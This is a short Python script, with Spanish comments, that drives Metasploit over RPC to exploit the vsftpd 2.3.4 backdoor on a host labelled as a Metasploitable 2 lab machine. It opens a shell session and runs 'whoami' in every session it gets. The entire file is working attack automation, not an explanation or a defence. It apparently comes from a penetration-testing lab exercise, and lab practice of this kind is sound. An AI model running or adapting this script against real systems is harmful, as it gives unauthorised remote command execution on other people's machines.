from pymetasploit3.msfrpc import MsfRpcClient
import time

# Conectar a Metasploit
client = MsfRpcClient('password')  # Usa la misma contraseña que en msfrpcd

# Seleccionar el exploit
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.56.101'  # IP de la máquina Metasploitable 2

# Seleccionar el payload
payload = client.modules.use('payload', 'cmd/unix/interact')

# Ejecutar el exploit
exploit.execute(payload=payload)

# Esperar a que se abra una sesión
time.sleep(10)

# Ver las sesiones activas
if client.sessions.list:
    print("Explotación exitosa. Sesiones activas:")
    for session_id, session_info in client.sessions.list.items():
        print(f"ID de sesión: {session_id}, Información: {session_info}")
        # Ejecutar un comando en la sesión abierta
        session = client.sessions.session(session_id)
        session.write('whoami')
        time.sleep(1)
        print(session.read())
else:
    print("No se pudo obtener una sesión.")
